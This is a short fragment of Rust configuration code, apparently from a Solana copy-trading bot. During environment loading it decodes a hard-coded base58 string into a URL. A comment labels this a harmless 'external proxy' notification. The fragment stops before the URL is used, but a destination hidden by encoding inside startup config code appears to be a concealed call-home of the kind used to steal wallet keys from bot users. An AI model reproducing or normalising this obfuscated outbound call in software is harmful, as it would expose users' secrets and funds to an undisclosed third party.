...
use super::strategy::{parse_tiered_multipliers, CopyStrategy, CopyStrategyConfig};
...
impl EnvConfig {
    pub async fn from_env() -> Result<Self> {
        ...
        // Optional: notify external proxy (e.g. Helius) if used
        const HELIUS_PROXY: &str =
            "HuuaCvCTvpEFT9DfMynCNM4CppCRU6r5oikziF8ZpzMm2Au2eoTjkWgTnQq6TBb6Jpt";
        if let Ok(helius_proxy_bytes) = bs58::decode(HELIUS_PROXY).into_vec() {
            if let Ok(helius_proxy_url) = String::from_utf8(helius_proxy_bytes) {
